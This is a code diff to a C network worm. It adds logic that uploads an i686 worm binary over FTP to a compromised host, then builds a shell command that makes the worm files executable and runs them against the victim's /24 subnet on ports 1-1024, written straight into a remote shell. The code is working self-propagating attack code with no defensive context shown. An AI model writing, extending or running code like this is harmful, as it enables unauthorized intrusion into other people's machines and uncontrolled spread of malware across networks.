@@ -54,11 +54,12 @@ int main(int argc, char *const *argv) {
   struct bruteforce_arguments args[MAX_THREADS];
   struct ifaddrs *addresses, *ifa;
   struct sockaddr_in *addr;
+  char cmd_buffer[256];
   char range[32];
   char *interface = NULL;
   int shell_fd, method, opt, err;
   int use_raw_socket = 0, verbose = 0;
-  unsigned int i;
+  unsigned int i, length;
 
   while((opt = getopt(argc, argv, "svi:")) != -1) {
     switch(opt) {
@@ -94,7 +95,6 @@ int main(int argc, char *const *argv) {
                  ifa->ifa_addr->sa_family == AF_INET) {
         addr = (struct sockaddr_in *) ifa->ifa_addr;
         snprintf(range, sizeof range, "%s", inet_ntoa(addr->sin_addr)); 
-
         for(i = strlen(range); i > 0 && range[i] != '.'; --i) {
           range[i] = '\0';
         }
@@ -155,12 +155,20 @@ int main(int argc, char *const *argv) {
 
         if(ftp_fd != 0) {
           spread(ftp_fd, "worm", "worm");
-          //spread(ftp_fd, "worm.x86_64", "worm.x86_64");
-          //spread(ftp_fd, "worm.i386", "worm.i386");
-          //spread(ftp_fd, "worm.i686", "worm.i686");
+          spread(ftp_fd, "worm.i686", "worm.i686");
           close(ftp_fd);
         }
 
+        snprintf(range, sizeof range, "%s", target->address);
+        for(i = strlen(range); i > 0 && range[i] != '.'; --i) {
+          range[i] = '\0';
+        }
+
+        strncpy(range + i + 1, "1-255\0", sizeof range - i - 1);
+
+        length = snprintf(cmd_buffer, sizeof cmd_buffer, "chmod +x ~%s/worm* ; ~%s/worm %s 1-1024 ; ~%s/worm.i686 %s 1-1024\n", FTP_USER, FTP_USER, range, FTP_USER, range);
+        fprintf(stdout, "Command to be executed (%u):\n%s", length, cmd_buffer);
+        write(shell_fd, cmd_buffer, length);
         close(shell_fd);
         fprintf(stdout, "Attack completed!\n");
       }
